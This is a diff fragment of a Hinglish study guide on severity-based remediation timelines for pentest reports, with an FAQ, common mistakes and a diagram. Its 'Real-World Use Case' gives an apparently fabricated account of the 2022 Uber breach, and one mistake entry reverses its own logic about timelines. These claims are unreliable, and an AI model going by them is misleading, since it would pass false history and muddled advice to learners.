+   "Remediation Timeline: Critical severity, fix within 7 days of report validation."
+4. Optional: Additional notes like "Immediate mitigation: block IP addresses."
+
+### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Client ne timeline ke andar fix kar diya.
+- **Failure:** Client ne delay kiya, vulnerability exploit ho gayi.
+
+### 9. ⚖️ Comparison (X vs Y)
+
+| Priority | Timeline | Typical Fix Complexity |
+|----------|----------|------------------------|
+| P1 (Critical) | 7 days | High (code change + deploy) |
+| P2 (High) | 30 days | Medium (config/code change) |
+| P3 (Medium) | 90 days | Low (config tweak) |
+| P4 (Low) | Best effort | Very low |
+
+### 10. 🚫 Common Mistakes (Beginner Traps)
+- **Mistake:** Critical vulnerability ko High bol dena, jisse timeline kam milti hai.  
+  **Fix:** CVSS correctly calculate karo.
+- **Mistake:** Report mein timeline mention na karna.  
+  **Fix:** Always include in "Remediation" section.
+- **Mistake:** Ek hi timeline sabke liye dena (e.g., 30 days for all).  
+  **Fix:** Severity ke hisaab se differentiate karo.
+
+### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+**Q:** "Critical vulnerability ke liye 7 days enough hai?"  
+**A:** Haan, generally hota hai. Lekin agar fix complicated hai, toh interim mitigation steps suggest karo (e.g., WAF rule, disabling feature).
+
+**Q:** "Low vulnerability ko fix karne ki kya zaroorat?"  
+**A:** Defense-in-depth ke liye, aur future attacks mein inhe combine kar sakte hain. Isliye "best effort" kaho.
+
+**Q:** "Kya timelines industry-wide standard hain?"  
+**A:** Mostly yes. Bug bounty platforms jaise HackerOne yahi recommend karte hain. PCI-DSS bhi similar timelines deta hai.
+
+### 12. 🌍 Real-World Use Case
+**Uber breach (2022)** mein ek critical vulnerability thi jo 7 days ke andar fix ho gayi, lekin attacker ne usi window mein data steal kar liya. Isliye critical bugs ke liye 24-48 hours bhi recommend kiye jate hain.
+
+### 13. 🎨 Visual Diagram (ASCII Art)
+```
+[Vulnerability Found] --> [Severity Assessment] --> [Timeline Assignment]
+                                      |
+                    +-----------------+-----------------+
+                    |                 |                 |
+              [Critical 7d]      [High 30d]       [Medium 90d]
+```
+
+### 14. 🛠️ Best Practices (Pro Tips)
+- Always include "Suggested Remediation Timeline" in report.
+- For critical, mention "Immediate action required".
+- If exploit is public, timeline should be shorter (24h).
+- Follow up after timeline expires.
+
+### 15. ❓ FAQ (Interview Questions)
+**Q1: Critical vulnerability ke liye typical timeline kya hai?**  
+A: 7 days, but sometimes 24-48 hours for actively exploited.
+
+**Q2: Medium severity vulnerability ko kitne din mein fix karna chahiye?**  
+A: 90 days.
+
+**Q3: Agar vulnerability ko fix karna technically impossible ho toh?**  
+A: Accept the risk, document, and implement compensating controls.
+
+**Q4: Low severity vulnerabilities ko ignore kar sakte hain?**  
+A: No, but can be fixed in next release cycle.
+
+**Q5: Timeline start kab hota hai – report submission se ya validation ke baad?**  
+A: Usually after validation and acceptance by the team.
+
+### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+"Critical 7, High 30, Medium 90 – timelines se hi patch management smart."
 
 ---
 
